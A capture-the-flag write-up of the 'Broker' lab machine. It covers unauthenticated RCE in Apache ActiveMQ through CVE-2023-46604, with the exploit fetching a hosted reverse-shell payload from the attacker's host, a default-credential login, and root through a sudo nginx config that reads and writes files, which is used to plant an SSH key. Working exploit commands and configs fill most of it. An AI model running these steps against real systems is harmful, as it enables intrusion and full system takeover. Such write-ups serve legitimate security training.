#Linux #CVE #ApacheActiveMQ #Jenkins #sudo #nginx #sshkeygen #fileread

## Overview

Broker is an easy Linux box built on **CVE-2023-46604**, a critical unauthenticated RCE in Apache ActiveMQ that made a lot of noise in late 2023. The privilege escalation is a textbook `sudo` abuse: permission to run `nginx` as root lets me spin up a rogue web server that both reads any file on disk and, via WebDAV `PUT`, *writes* one, which I use to plant an SSH key in root's home.

## Recon

The site sits behind HTTP basic auth. Cancelling the auth prompt to trigger the error page leaks the server banner:

```
Powered by Jetty:// 9.4.39.v20210325
```

A guess of `admin:admin` got through the basic auth, revealing the application underneath: **Apache ActiveMQ**.

## Foothold

### CVE-2023-46604, ActiveMQ OpenWire RCE

> **How the bug works:** ActiveMQ's OpenWire protocol deserializes class names sent by a client and instantiates them. An attacker can force it to instantiate Spring's `ClassPathXmlApplicationContext` pointed at a *remote* XML file. ActiveMQ fetches that XML and Spring dutifully wires up the beans it defines, including one that runs an OS command. So a single crafted packet plus a hosted XML payload equals RCE as the broker user.

I hosted the reverse-shell XML on Kali and ran [evkl1d's exploit](https://github.com/evkl1d/CVE-2023-46604), pointing the target at my payload URL:

```sh
python3 exploit.py -i 10.129.230.87 -u http://10.10.14.128/poc.xml
```

The target pulled the XML from my web server:

```sh
python3 -m http.server 80
10.129.230.87 - - "GET /poc.xml HTTP/1.1" 200 -
```

And a shell landed as `activemq`:

```sh
rlwrap nc -lvnp 9001
activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
activemq
```

## Privilege Escalation

### sudo nginx → Arbitrary File Read, then Write

```sh
sudo -l
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

> **Why running `nginx` as root is dangerous:** `nginx` takes a `-c <config>` flag, and the config controls everything, which user it runs as, what directory it serves, and which HTTP methods it accepts. Running it as root with an attacker-supplied config turns it into a root-privileged file server (and, with WebDAV, a file *writer*).

First I served the entire filesystem read-only, enough to read the root flag:

```nginx
user root;
events { worker_connections 1024; }
http{ server { listen 1337; root /; autoindex on; } }
```

```sh
sudo /usr/sbin/nginx -c /dev/shm/evil.conf
```

For full access I went further, enabling WebDAV `PUT` so the server can write files as root:

```nginx
http{ server { listen 1338; root /; autoindex on; dav_methods PUT; } }
```

```sh
curl localhost:1338    # confirms the whole filesystem is served
```

### Planting an SSH Key

I generated a keypair on Kali, then `PUT` the public key straight into root's `authorized_keys` through the rogue server:

```sh
ssh-keygen -q -t rsa -N '' -C 'pam'
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAA...= pam'
```

## Root

With the key in place, SSH as root succeeds:

```sh
ssh -i evil_rsa root@10.129.45.81
root@broker:~# whoami
root
```

## Takeaways

- **Error pages leak versions.** Cancelling basic auth exposed the Jetty banner and pointed at ActiveMQ.
- **CVE-2023-46604 is a one-packet RCE** against unpatched ActiveMQ, keep message brokers off the public edge and patched.
- **`sudo` on a flexible binary is as good as a root shell.** `nginx -c` with an attacker config gives root file read; WebDAV `PUT` upgrades that to write, and an SSH key turns write into a clean interactive root login.
